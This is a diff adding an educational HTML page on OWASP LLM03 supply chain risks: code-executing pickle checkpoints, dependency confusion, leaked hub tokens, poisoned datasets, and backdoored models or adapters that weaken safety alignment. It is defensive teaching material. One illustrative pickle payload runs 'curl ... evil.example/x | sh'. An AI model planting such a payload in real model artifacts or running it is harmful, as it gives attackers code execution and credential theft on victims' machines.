@@ -217,39 +217,236 @@
         <div class="content">
             <h1>Supply Chain Vulnerabilities - Overview</h1>
 
-<h2>What is Supply Chain Vulnerabilities?</h2>
-
-<p>Risks from third-party models, datasets, and plugins</p>
-
-<h2>Why is it Dangerous?</h2>
-
-<p>LLM vulnerabilities pose unique risks in AI systems:</p>
+<div class="toc">
+<h2>Table of Contents</h2>
 <ul>
-<li><strong>Data Privacy</strong>: Exposure of training data or sensitive information</li>
-<li><strong>Model Integrity</strong>: Manipulation of model behavior</li>
-<li><strong>Resource Abuse</strong>: Excessive computational costs</li>
-<li><strong>Trust Erosion</strong>: Misinformation and hallucinations</li>
+<li><a href="#what-is-supply-chain">What is an LLM Supply Chain Vulnerability?</a></li>
+<li><a href="#why-does-this-matter">Why Does This Matter?</a></li>
+<li><a href="#technical-context">Technical Context</a></li>
+<li><a href="#real-world-impact">Real-World Impact</a></li>
+<li><a href="#prevalence">Prevalence and Trends</a></li>
+<li><a href="#common-misunderstandings">Common Misunderstandings</a></li>
+<li><a href="#how-it-differs">How It Differs From Related Risks</a></li>
+<li><a href="#self-assessment">Self-Assessment</a></li>
+</ul>
+</div>
+
+<h2 id="what-is-supply-chain">What is an LLM Supply Chain Vulnerability?</h2>
+
+<p><strong>LLM03:2025 &mdash; Supply Chain</strong> covers the risk that a component you did not build&mdash;a pre-trained model, a set of fine-tuning weights, a dataset, a tokenizer, a serving framework, or a Python package&mdash;arrives already compromised, tampered with, or otherwise untrustworthy, and you integrate it into your system without ever verifying where it came from. It is not a flaw in <em>your</em> prompt handling or <em>your</em> model logic. It is a failure of <strong>provenance and trust</strong>: you inherited someone else's problem the moment you ran <code>pip install</code> or <code>from_pretrained(...)</code>.</p>
+
+<p>Traditional application security already worries about vulnerable third-party libraries (this is OWASP <em>A06: Vulnerable and Outdated Components</em>). The LLM supply chain inherits every one of those problems <em>and adds several new ones that have no equivalent in ordinary software</em>:</p>
+
+<ul>
+<li>A <strong>model artifact is executable data</strong>. Many popular model formats are Python pickle streams, and loading one can run arbitrary code&mdash;there is no such thing as "just downloading the weights."</li>
+<li>A model's behaviour is <strong>opaque</strong>. A backdoored model passes every functional test yet misbehaves only on a secret trigger. You cannot code-review a 7-billion-parameter tensor the way you review a function.</li>
+<li>The <strong>training data is part of the supply chain</strong>. A model fine-tuned on a poisoned public dataset carries that poison forward, even if the weights were never touched after training.</li>
+<li>The ecosystem depends on <strong>open community hubs</strong> (Hugging Face, PyPI, npm, dataset mirrors) where anyone can publish, typosquat, or hijack an abandoned name.</li>
 </ul>
 
-<h2>Real-World Impact (2025 Context)</h2>
+<p>In the 2025 edition of the OWASP Top 10 for LLM Applications, this category was expanded from the 2023 "Supply Chain Vulnerabilities" entry to explicitly include <strong>third-party pre-trained models, LoRA adapters and other fine-tunes, on-device/edge model distribution, and the unclear terms, licensing, and data-protection posture of model and dataset providers</strong>.</p>
 
-<p>Modern LLM applications face:</p>
+<h3>Core Concept</h3>
+
+<pre><code>Trusted supply chain:                 Compromised supply chain:
+  source pinned + verified              "latest" pulled from anywhere
+  hash / signature checked              no integrity check at all
+  safetensors (inert weights)           pickle / torch.load (executes code)
+  SBOM / AI-BOM inventory               unknown transitive dependencies
+  license + provenance reviewed         backdoored fine-tune, poisoned dataset
+  scanned before load                   loaded straight into production</code></pre>
+
+<p>The essential question of LLM03 is simple and unglamorous: <strong>&ldquo;Do you actually know what you just loaded, and can you prove it has not been altered since the author published it?&rdquo;</strong> For most teams shipping AI features today, the honest answer is no.</p>
+
+<h2 id="why-does-this-matter">Why Does This Matter?</h2>
+
+<p>Supply chain compromise is attractive to attackers because it is a <strong>force multiplier</strong>: poison one popular model or package and you compromise every downstream consumer at once, silently, before any of your own defensive code ever runs. The malicious payload executes <em>at load time</em>, inside your trust boundary, with your service account's permissions.</p>
+
+<h3>Business Impact</h3>
 <ul>
-<li>Integration with enterprise systems</li>
-<li>Autonomous agent capabilities</li>
-<li>RAG (Retrieval Augmented Generation) systems</li>
-<li>Vector database dependencies</li>
-<li>Production-scale deployments</li>
+<li><strong>Remote code execution on your infrastructure</strong>: A malicious model or package runs code on the machine that loads it&mdash;often a GPU box with cloud credentials, database access, and internal network reachability.</li>
+<li><strong>Silent, long-dwell backdoors</strong>: A tampered model can behave perfectly until a hidden trigger fires, so the compromise survives QA, ships to customers, and is discovered only after damage is done.</li>
+<li><strong>Data exfiltration and credential theft</strong>: Load-time payloads routinely harvest environment variables, cloud metadata tokens, SSH keys, and Hugging Face / registry tokens, then pivot.</li>
+<li><strong>Regulatory and contractual exposure</strong>: Shipping a model whose license forbids commercial use, or whose training data was scraped unlawfully, creates IP and privacy liability (GDPR, licensing disputes) regardless of intent.</li>
+<li><strong>Reputational and trust damage</strong>: "Our AI feature shipped malware" or "our chatbot was backdoored" is a headline that erodes customer trust far beyond the technical incident.</li>
 </ul>
 
-<h2>Common Scenarios</h2>
+<h3>Technical Impact</h3>
+<ul>
+<li><strong>Arbitrary code execution at deserialization time</strong>: <code>pickle</code>, <code>torch.load</code>, Keras <code>Lambda</code> layers, and joblib artifacts can all execute attacker code the instant they are opened.</li>
+<li><strong>Model integrity loss</strong>: Tampered weights or a malicious LoRA adapter can introduce bias, backdoors, or degraded safety alignment invisible to functional tests.</li>
+<li><strong>Dependency confusion and typosquatting</strong>: A subtly misnamed or version-shadowing package is resolved instead of the one you intended, injecting hostile code into your build.</li>
+<li><strong>Poisoned provenance</strong>: A model card, dataset, or benchmark you trusted was itself falsified, so your "verification" verified nothing.</li>
+<li><strong>Vulnerable serving stack</strong>: Outdated inference servers, web UIs, and orchestration frameworks (the plumbing around the model) expose their own RCE and auth-bypass bugs.</li>
+</ul>
+
+<h2 id="technical-context">Technical Context</h2>
+
+<h3>The LLM Supply Chain, End to End</h3>
+
+<pre><code>[Base model author] -&gt; [Model hub] -&gt; [Fine-tune / LoRA] -&gt; [Packaging] -&gt; [Serving stack] -&gt; [Your app]
+        |                  |               |                    |                |               |
+   training data      account can       adapter can        pickle vs        vulnerable       loads &amp; trusts
+   may be poisoned    be hijacked       carry backdoor     safetensors      dependencies     everything above</code></pre>
+
+<p>Every arrow in that chain is a trust boundary, and each one is routinely crossed with no verification at all. The most important thing to understand is that a model file is <strong>not</strong> passive data.</p>
+
+<h4>Why loading a model can run code</h4>
+
+<p>Python's <code>pickle</code> format is a <em>program</em>, not a document: it encodes instructions that reconstruct objects, and those instructions can include arbitrary callables via the <code>__reduce__</code> mechanism. PyTorch's classic <code>torch.load</code> is built on pickle, so a <code>.bin</code>, <code>.pt</code>, or <code>.ckpt</code> checkpoint can execute code the moment you deserialize it&mdash;before you run a single inference.</p>
+
+<pre><code># Conceptually, a malicious checkpoint embeds something like this:
+class Payload:
+    def __reduce__(self):
+        import os
+        return (os.system, ("curl -s https://evil.example/x | sh",))
+
+# torch.load(...) / pickle.load(...) will EXECUTE that during "loading".
+# No inference has run. The model was never even used.</code></pre>
+
+<p>This is why the ecosystem is migrating to <strong>safetensors</strong>: a format that stores only raw tensors plus a JSON header, contains no executable opcodes, and therefore cannot run code when loaded. Formats matter more than any single scan.</p>
+
+<h4>The many entry points</h4>
+
+<table>
+<thead>
+<tr><th>Supply chain element</th><th>How it is compromised</th><th>Primary consequence</th></tr>
+</thead>
+<tbody>
+<tr><td>Pre-trained model weights</td><td>Malicious pickle payload; tampered tensors; backdoor trigger</td><td>RCE on load; hidden malicious behaviour</td></tr>
+<tr><td>Model hub account (e.g. Hugging Face)</td><td>Leaked write token; hijacked/abandoned namespace</td><td>Legit repo replaced with trojaned artifact</td></tr>
+<tr><td>LoRA / adapter / fine-tune</td><td>Backdoor introduced during fine-tuning; malicious adapter</td><td>Integrity loss even over a clean base model</td></tr>
+<tr><td>Training / RAG dataset</td><td>Web-scale poisoning; frontrunning expired dataset URLs</td><td>Poisoned behaviour baked into weights or retrieval</td></tr>
+<tr><td>Python / npm package</td><td>Typosquat, dependency confusion, hijacked maintainer</td><td>Hostile code in your build and runtime</td></tr>
+<tr><td>Serving / orchestration stack</td><td>Outdated framework with known CVEs; exposed dashboards</td><td>RCE, auth bypass, cluster takeover</td></tr>
+<tr><td>Provider terms &amp; license</td><td>Unclear licensing, non-commercial data, T&amp;C changes</td><td>Legal, IP, and compliance exposure</td></tr>
+</tbody>
+</table>
+
+<h3>Formats: which ones execute code?</h3>
+
+<table>
+<thead>
+<tr><th>Format / extension</th><th>Loaded via</th><th>Can execute code on load?</th></tr>
+</thead>
+<tbody>
+<tr><td><code>.safetensors</code></td><td><code>safetensors.torch.load_file</code></td><td>No &mdash; inert tensors + JSON header</td></tr>
+<tr><td><code>.bin</code>, <code>.pt</code>, <code>.pth</code>, <code>.ckpt</code></td><td><code>torch.load</code> (pickle)</td><td>Yes &mdash; arbitrary code via pickle</td></tr>
+<tr><td><code>.pkl</code>, <code>.joblib</code></td><td><code>pickle</code> / <code>joblib.load</code></td><td>Yes</td></tr>
+<tr><td><code>.h5</code> / Keras SavedModel</td><td><code>keras.models.load_model</code></td><td>Yes &mdash; <code>Lambda</code> layers embed code</td></tr>
+<tr><td>GGUF</td><td>llama.cpp loaders</td><td>Largely data; still verify source and parser version</td></tr>
+</tbody>
+</table>
+
+<h2 id="real-world-impact">Real-World Impact</h2>
+
+<p>The incidents below are described as <strong>classes of documented, publicly reported events</strong>. Specifics (exact counts, dates, package names) vary between sources; treat them as illustrative of a repeatable pattern rather than precise figures.</p>
+
+<h3>Case Class 1: Malicious models on public hubs</h3>
+<p>Security researchers (for example JFrog and ReversingLabs) have repeatedly reported models hosted on the Hugging Face Hub that carried <strong>pickle-based payloads executing code on load</strong>. Some samples deliberately used broken or non-standard pickle streams to slip past automated scanners (a technique dubbed "nullifAI") while still executing on the victim's machine.</p>
+<p><strong>Root cause</strong>: Open publishing plus a code-executing format plus consumers who call <code>from_pretrained</code>/<code>torch.load</code> on untrusted repos without scanning or format restrictions.</p>
+
+<h3>Case Class 2: Dependency-confusion in the ML toolchain</h3>
+<p>In late 2022 the PyTorch project disclosed that a dependency of its nightly builds, <code>torchtriton</code>, was <strong>shadowed by a malicious package of the same name on the public PyPI index</strong>. Because the public index took precedence during resolution, affected installs pulled the hostile package, which exfiltrated environment data. This is the canonical example of dependency confusion striking core ML infrastructure.</p>
+<p><strong>Root cause</strong>: A private/internal package name that also existed (or could be registered) on a public index, with no pinning, index scoping, or hash verification.</p>
+
+<h3>Case Class 3: Leaked hub tokens and account takeover</h3>
+<p>Researchers (for example Lasso Security) have found <strong>exposed Hugging Face access tokens</strong> committed to public repositories, some granting write access to models and datasets owned by major organizations. A stolen write token lets an attacker replace a trusted artifact in place&mdash;every downstream <code>from_pretrained</code> then pulls the trojaned version.</p>
+<p><strong>Root cause</strong>: Registry credentials treated casually; broad token scopes; no provenance check that would notice a swapped artifact.</p>
+
+<h3>Case Class 4: Poisoning public training / RAG datasets</h3>
+<p>Academic work such as Carlini et al.'s "Poisoning Web-Scale Training Datasets is Practical" demonstrated realistic attacks (split-view poisoning and <strong>frontrunning expired dataset URLs</strong>) against the kind of large public corpora used to train and fine-tune models. Poison introduced upstream propagates into every model trained on that data.</p>
+<p><strong>Root cause</strong>: Datasets referenced by mutable URLs with no content-hash pinning, so what you download is not necessarily what the dataset authors curated.</p>
+
+<h3>Case Class 5: Vulnerable serving and orchestration stacks</h3>
+<p>The frameworks <em>around</em> the model are ordinary software with ordinary bugs. Public findings against ML infrastructure&mdash;such as Oligo's "ShadowRay" work on exposed Ray clusters, and a steady stream of CVEs in inference UIs and servers (Gradio, and others)&mdash;show that an outdated or exposed serving stack is often the easiest way in, model or no model.</p>
+<p><strong>Root cause</strong>: Rapidly moving AI infra pulled in at "latest," rarely patched, and sometimes exposed to the internet without authentication.</p>
+
+<h2 id="prevalence">Prevalence and Trends</h2>
+
+<p>Rather than cite a single disputed statistic, the durable picture is:</p>
+<ul>
+<li>Supply chain risk was significant enough that OWASP kept it in the LLM Top 10 across editions and <strong>broadened its scope for 2025</strong> to cover third-party models, adapters, and provider terms.</li>
+<li>The underlying enabler&mdash;<strong>code-executing model formats</strong>&mdash;is extremely common: a large fraction of artifacts on public hubs are still pickle-based rather than safetensors.</li>
+<li>General software supply chain attacks (typosquatting, dependency confusion, maintainer hijacks on PyPI and npm) have risen year over year, and the ML ecosystem is a prime, fast-growing target.</li>
+<li>Most teams have <strong>no AI-BOM</strong>: they cannot enumerate which models, adapters, datasets, and model-serving dependencies are in production, let alone verify them.</li>
+</ul>
+
+<blockquote>
+<p>Note: exact percentages and incident counts differ between reports and change quickly. The reliable takeaway is that the LLM supply chain is broad, under-inventoried, and actively targeted&mdash;and that the single biggest lever is choosing inert formats and verifying provenance.</p>
+</blockquote>
+
+<h2 id="common-misunderstandings">Common Misunderstandings</h2>
+
+<h3>Myth 1: "Downloading a model is just downloading data"</h3>
+<p><strong>Reality</strong>: Pickle-based checkpoints execute code on load. Opening the file <em>is</em> running the author's program. Only inert formats like safetensors make "just data" literally true.</p>
+
+<h3>Myth 2: "It's on Hugging Face, so it's been vetted"</h3>
+<p><strong>Reality</strong>: Public hubs are open-publishing platforms, not curated app stores. Automated pickle scanning helps but has been evaded; download counts and stars are not integrity guarantees.</p>
+
+<h3>Myth 3: "We passed a malware scan, so the model is safe"</h3>
+<p><strong>Reality</strong>: A scanner catches known-bad pickle opcodes, not a semantic <em>backdoor</em> in the weights. A model can be malware-free and still be trained to misbehave on a secret trigger. Format restriction, provenance, and behavioural testing all matter.</p>
+
+<h3>Myth 4: "We pinned our top-level packages, so the build is reproducible"</h3>
+<p><strong>Reality</strong>: Transitive dependencies and unpinned model/dataset URLs are the usual entry points. Without hashes and a lockfile that covers the full tree, "pinned" is a comforting illusion.</p>
+
+<h3>Myth 5: "This is the same as poisoning (LLM04)"</h3>
+<p><strong>Reality</strong>: They overlap but are distinct. LLM04 (Data and Model Poisoning) is about <em>how</em> malicious behaviour is introduced into training. LLM03 is about <em>trust and provenance of third-party components</em>&mdash;the fact that you imported someone else's poisoned or tampered artifact at all. A poisoned dataset you pulled from a public mirror is a supply chain failure (LLM03) that results in poisoning (LLM04).</p>
+
+<h3>Myth 6: "License and terms are legal's problem, not security's"</h3>
+<p><strong>Reality</strong>: Unclear or non-commercial licenses, and providers that can change terms or training-data claims, are a supply chain risk to availability and compliance. A model you cannot legally ship is as broken, operationally, as one that fails to load.</p>
+
+<h2 id="how-it-differs">How It Differs From Related Risks</h2>
+
+<table>
+<thead>
+<tr><th>Aspect</th><th>LLM03 Supply Chain</th><th>LLM04 Data &amp; Model Poisoning</th><th>A06 Vulnerable Components</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Core question</strong></td><td>Can I trust this third-party artifact's origin?</td><td>Was malicious behaviour trained in?</td><td>Is this dependency patched?</td></tr>
+<tr><td><strong>Typical entry</strong></td><td>Hub, PyPI/npm, dataset mirror, provider</td><td>Training/fine-tuning pipeline</td><td>Library version</td></tr>
+<tr><td><strong>Signature move</strong></td><td>Verify provenance, hashes, signatures; inert formats</td><td>Curate data, evaluate behaviour</td><td>Upgrade, SCA scan</td></tr>
+<tr><td><strong>Failure mode</strong></td><td>RCE on load; trojaned artifact swapped in</td><td>Backdoor / bias in outputs</td><td>Known CVE exploited</td></tr>
+</tbody>
+</table>
+
+<h2 id="self-assessment">Self-Assessment</h2>
+
+<p>Ask these questions about your LLM stack:</p>
+<ul>
+<li>[ ] Can you produce an AI-BOM listing every model, adapter, dataset, and serving dependency in production?</li>
+<li>[ ] Is every model artifact loaded from a <strong>pinned revision</strong> (commit hash), not a mutable tag or "latest"?</li>
+<li>[ ] Do you verify a <strong>hash or signature</strong> for each model before loading it?</li>
+<li>[ ] Do you prefer <code>safetensors</code> and refuse or sandbox pickle-based formats from untrusted sources?</li>
+<li>[ ] Are models scanned (e.g. pickle/opcode scanning) before they ever reach production?</li>
+<li>[ ] Are Python/npm dependencies fully locked <strong>with hashes</strong>, and is your internal index protected against dependency confusion?</li>
+<li>[ ] Are datasets referenced by content hash rather than a mutable URL?</li>
+<li>[ ] Is your model-serving stack (inference server, UI, orchestrator) patched and never exposed unauthenticated?</li>
+<li>[ ] Have the license and data-protection terms of every third-party model and dataset been reviewed?</li>
+<li>[ ] Would you <em>notice</em> if a trusted upstream artifact were swapped for a tampered one tomorrow?</li>
+</ul>
+
+<p>Several "no" or "not sure" answers mean you are trusting components you cannot verify&mdash;the exact condition LLM03 describes.</p>
+
+<h2>Key Takeaways</h2>
 
 <ol>
-<li><strong>Enterprise Chatbots</strong>: Customer service LLMs exposed to prompt injection</li>
-<li><strong>Code Assistants</strong>: AI pair programmers with excessive system access</li>
-<li><strong>Document Analysis</strong>: RAG systems vulnerable to poisoned embeddings</li>
-<li><strong>Automated Workflows</strong>: LLM agents with inappropriate permissions</li>
+<li><strong>A model is executable, not inert.</strong> Format choice (safetensors over pickle) is the highest-leverage control you have.</li>
+<li><strong>Provenance beats reputation.</strong> Pin revisions, verify hashes/signatures, and confirm the author&mdash;stars and download counts prove nothing.</li>
+<li><strong>Inventory everything.</strong> You cannot defend a supply chain you have never enumerated; build an AI-BOM.</li>
+<li><strong>The plumbing counts too.</strong> Packages, datasets, and serving frameworks are all part of the chain and all get attacked.</li>
+<li><strong>Assume swap-in.</strong> Design so that a tampered upstream artifact is detected by integrity checks before it ever loads.</li>
 </ol>
+
+<h2>Next Steps</h2>
+
+<ul>
+<li><strong><a href="attack-vectors.html">Attack Vectors</a></strong>: How attackers poison and hijack the LLM supply chain, with code.</li>
+<li><strong><a href="prevention.html">Prevention</a></strong>: Layered defenses&mdash;provenance, inert formats, scanning, AI-BOM, sandboxing.</li>
+<li><strong><a href="examples.html">Examples</a></strong>: Vulnerable vs. secure model loading and dependency handling.</li>
+<li><strong><a href="./lab/supply-chain-vulnerabilities/">Hands-On Lab</a></strong>: Practice detecting and safely loading untrusted models.</li>
+</ul>
+
 
         </div>
     </div>
